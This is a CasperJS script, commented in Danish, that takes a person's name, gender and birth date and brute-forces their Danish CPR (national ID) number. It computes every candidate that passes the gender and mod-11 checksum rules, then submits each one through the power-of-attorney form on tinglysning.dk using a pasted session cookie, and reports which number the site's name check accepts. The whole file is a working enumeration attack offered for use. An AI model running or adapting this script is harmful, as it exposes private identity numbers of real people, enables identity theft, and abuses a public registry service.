// ******************** INDSTILLINGER START ******************** //
 
// Indsæt URL fra browser
// Eksempelvis: https://www.tinglysning.dk /tinglysning/fuldmagt/opretfuldmagt.xhtml?_abPfm=-v7jsugjo5
var url = '';
 
// Indsæt cookie værdi (TDK_JSESSIONID)
// Eksempelvis: asdasAZC9KkKYcdYsUVhBac15Lsyjdfp5dvYkJn957bbmNqnJk5!-300513349!-310799201
var TDK_JSESSIONID = '';
 
var person = {
  fullName: '', // Eksempel: Lars Larsen
  gender:  '', // Eksempel: male
  birthDay: '', // Eksempel: 24
  birthMonth: '', // Eksempel: 12
  birthYear: '' // Eksempel: 1989
}
 
// ******************** INDSTILLINGER SLUT ******************** //
 
var casper = require('casper').create({
pageSettings: {
        loadImages:  false,
        loadPlugins: false,
        userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A"
    },
  logLevel: "debug",
  verbose: false
});
 
var utils = require('utils');
var f = utils.format;
 
casper.checkStep = function checkStep(self, onComplete) {
    if (self.pendingWait || self.loadInProgress) {
        return;
    }
    self.current = self.step;
    var step = self.steps[self.step++];
    if (utils.isFunction(step)) {
        self.runStep(step);
        step.executed = true;
    } else {
        self.result.time = new Date().getTime() - self.startTime;
        self.log(f("Done %s steps in %dms", self.steps.length, self.result.time), "info");
        clearInterval(self.checker);
        self.emit('run.complete');
        if (utils.isFunction(onComplete)) {
            try {
                onComplete.call(self, self);
            } catch (err) {
                self.log("Could not complete final step: " + err, "error");
            }
        } else {
            self.exit();
        }
    }
};
 
casper.then = function then(step) {
    if (!this.started) {
        throw new CasperError("Casper not started; please use Casper#start");
    }
    if (!utils.isFunction(step)) {
        throw new CasperError("You can only define a step as a function");
    }
    if (this.checker === null) {
        step.level = 0;
        this.steps.push(step);
        step.executed = false;
        this.emit('step.added', step);
    } else {
 
      if( !this.steps[this.current].executed ) {
        try {
            step.level = this.steps[this.current].level + 1;
        } catch (e) {
            step.level = 0;
        }
        var insertIndex = this.step;
        while (this.steps[insertIndex] && step.level === this.steps[insertIndex].level) {
            insertIndex++;
        }
        this.steps.splice(insertIndex, 0, step);
        step.executed = false;
        this.emit('step.added', step);
      }
    }
    return this;
};
 
casper.label = function label( labelname ) {
  var step = new Function('"empty function for label: ' + labelname + ' "');
  step.label = labelname;
  this.then(step);
};
 
casper.goto = function goto( labelname ) {
  for( var i=0; i<this.steps.length; i++ ){
      if( this.steps[i].label == labelname ) {
        this.step = i;
      }
  }
};
 
casper.dumpSteps = function dumpSteps( showSource ) {
  this.echo( "=========================== Dump Navigation Steps ==============================", "RED_BAR");
  if( this.current ){ this.echo( "Current step No. = " + (this.current+1) , "INFO"); }
  this.echo( "Next    step No. = " + (this.step+1) , "INFO");
  this.echo( "steps.length = " + this.steps.length , "INFO");
  this.echo( "================================================================================", "WARNING" );
 
  for( var i=0; i<this.steps.length; i++){
    var step  = this.steps[i];
    var msg   = "Step: " + (i+1) + "/" + this.steps.length + "     level: " + step.level
    if( step.executed ){ msg = msg + "     executed: " + step.executed }
    var color = "PARAMETER";
    if( step.label    ){ color="INFO"; msg = msg + "     label: " + step.label }
 
    if( i == this.current ) {
      this.echo( msg + "     <====== Current Navigation Step.", "COMMENT");
    } else {
      this.echo( msg, color );
    }
    if( showSource ) {
      this.echo( "--------------------------------------------------------------------------------" );
      this.echo( this.steps[i] );
      this.echo( "================================================================================", "WARNING" );
    }
  }
};
 
var cprCalc = {
  CPR_MULTIPLICATION_TABLE: [4,3,2,7,6,5,4,3,2,1],
 
  firstSixDigits: function(year, month, day) {
    year = year.toString();
    month = month.toString();
    day = day.toString();
    return this.padNumber(day,2) + this.padNumber(month,2) + year.substr(2);
  },
 
  possibleLastFour: function(gender, year, month, day) {
    var possibleLastFour = [];
    firstSixDigits = this.firstSixDigits(year, month, day);
 
    for(i=0; i <= 9999; i++) {
      if (this.numberMatchesGender(i, gender)) possibleLastFour.push(this.padNumber(i, 4));
    }
 
    for(j=0; j < possibleLastFour.length; j++) {
      var entireCpr = firstSixDigits+possibleLastFour[j];
      if (this.excludedBy7thDigit(possibleLastFour[j], year)) possibleLastFour[j]=null;
      if (this.matchesModolus11(entireCpr)==false) { possibleLastFour[j]=null; }
    }
    cleanedLastFour = [];
    for(k=0; k < possibleLastFour.length; k++) { if(possibleLastFour[k]!=null) cleanedLastFour.push(possibleLastFour[k]) }
    return cleanedLastFour;
  },

  matchesModolus11: function(cpr) {
    var checkSum = 0;
    for(i=0; i < 10; i++) {
      currentCprDigit = parseInt(cpr.substr(i, 1));
      productOfDigitWithMultiplicationNumber = currentCprDigit*this.CPR_MULTIPLICATION_TABLE[i];
      checkSum = checkSum + productOfDigitWithMultiplicationNumber;
    }
    return (checkSum % 11 == 0);
  },

  excludedBy7thDigit: function(lastFour, yearOfBirth) {
    seventhDigit = lastFour.substr(0,1);
    if(yearOfBirth<2000 && yearOfBirth>1899) {
      if ((seventhDigit>=5) && (seventhDigit<=8)) return true;
    }
    return false;
  },
 
  numberMatchesGender: function(number, gender) {
    if((number % 2 == 1) && gender=="male") return true;
    if((number % 2 == 0) && gender=="female") return true;
    return false;
  },
 
  padNumber: function(n, width, z) {
    z = z || '0';
    n = n + '';
    return n.length >= width ? n : new Array(width - n.length + 1).join(z) + n;
  },
};
 
var colorizer = require('colorizer').create('Colorizer');
var cprList = cprCalc.possibleLastFour(person.gender, person.birthYear, person.birthMonth, person.birthDay);
var i = 0;
casper.options.viewportSize = {width: 1600, height: 950};
phantom.addCookie({
domain: 'www.tinglysning.dk',
    name: 'TDK_JSESSIONID',
    value: TDK_JSESSIONID
});
 
casper.start(url);
casper.label( "LOOP_START" );
casper.waitForSelector('.container-content');
casper.then(function() {
this.fillSelectors('.container-content', {
        'input[id="content:subform:opretfuldmagt:meddelelseshaverCprnummer"]': person.birthDay+person.birthMonth+person.birthYear[2]+person.birthYear[3]+"-"+cprList[i],
        'input[id="content:subform:opretfuldmagt:meddelelseshaverMatchNavn"]': person.fullName,
    }, false);
    this.clickLabel('Opdater', 'button');
})
casper.then(function() {
if (this.exists('li.infomessage')) {
        console.log(colorizer.colorize(person.birthDay+person.birthMonth+person.birthYear[2]+person.birthYear[3]+'-'+cprList[i]+' - Forkert', 'ERROR'));
        this.goto( "LOOP_START" );
        i++;
    } else {
    console.log(colorizer.colorize(person.birthDay+person.birthMonth+person.birthYear[2]+person.birthYear[3]+'-'+cprList[i]+' - Korrekt', 'INFO'));
    }
});
casper.then(function() {
    casper.wait(5000);
});
casper.run();